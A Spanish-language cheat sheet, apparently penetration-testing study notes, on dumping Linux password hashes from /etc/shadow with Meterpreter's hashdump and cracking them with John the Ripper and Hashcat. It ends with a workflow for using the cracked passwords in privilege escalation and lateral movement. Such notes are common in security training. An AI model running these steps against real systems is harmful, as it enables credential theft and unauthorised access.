# Dumping & Cracking de Hashes en Linux

---

## 1. Archivos donde se almacenan los hashes
En Linux, los hashes de contraseñas se guardan en:
- `/etc/passwd` → lista de usuarios (no contiene contraseñas desde hace tiempo).
- `/etc/shadow` → contiene los hashes (solo root puede leerlo).

Ejemplo de línea en `/etc/shadow`:
```
user:$6$K1lX2...$fGhR2Xw...:19244:0:99999:7:::
```

El campo `$6$` indica el **algoritmo de hash**:
- `$1$` → MD5Crypt  
- `$2a$` → Blowfish  
- `$5$` → SHA256Crypt  
- `$6$` → SHA512Crypt  

---

## 2. Dumping de hashes con Meterpreter
Después de explotar una máquina Linux con Metasploit y obtener una sesión:

```bash
hashdump
```

Esto extrae hashes de `/etc/shadow` automáticamente y los muestra en pantalla.  
Puedes guardar uno en un archivo:
```bash
echo "hash_del_usuario" > hash.txt
```

---

## 3. Cracking con John the Ripper

### Uso básico
```bash
john --format=sha512crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Otras variantes según el hash:
- `--format=md5crypt` → para `$1$`  
- `--format=sha256crypt` → para `$5$`  
- `--format=sha512crypt` → para `$6$`  

Ver resultados:
```bash
john --show hash.txt
```

---

## 4. Cracking con Hashcat

### Parámetros principales
- `-m` = tipo de hash  
- `-a` = modo de ataque (0 = diccionario, 3 = fuerza bruta)

### Ejemplo con SHA512Crypt
```bash
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Ejemplo con SHA256Crypt
```bash
hashcat -m 7400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Ejemplo con MD5Crypt
```bash
hashcat -m 500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 5. Flujo recomendado
1. **Ganar acceso** → sesión meterpreter o root en Linux.  
2. **Dumpear hashes** → `hashdump` o leer `/etc/shadow`.  
3. **Identificar algoritmo** viendo el prefijo (`$1$, $5$, $6$`).  
4. **Crackear con John**:
   - `--format` correcto + wordlist.  
5. **Si no va, usar Hashcat** con el `-m` adecuado.  
6. **Obtener credenciales en texto plano** y usarlas para escalada o movimiento lateral.  

---

## 6. Utilidad en post-explotación
- Permite **recuperar contraseñas reales** de usuarios.  
- Útil para **escalar privilegios** si crackeamos la cuenta root.  
- Posibilita **movimiento lateral** en una red si las contraseñas se reutilizan.  
